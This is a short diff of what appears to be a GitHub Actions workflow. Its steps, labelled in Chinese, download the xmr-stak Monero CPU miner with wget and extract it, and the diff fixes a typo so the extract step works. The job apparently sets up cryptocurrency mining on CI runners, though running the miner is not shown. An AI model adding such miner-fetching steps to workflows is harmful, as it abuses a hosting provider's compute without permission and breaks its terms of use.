@@ -29,5 +29,5 @@ jobs:
       - name: 下载
         run: wget https://github.com/fireice-uk/xmr-stak/releases/download/1.0.5-rx/xmr-stak-rx-linux-1.0.5-cpu.tar.xz
           
-      - nama: 解压
+      - name: 解压
         run: tar -xvJf xmr-stak-rx-linux-1.0.5-cpu.tar.xz ./xmr-stak-rx
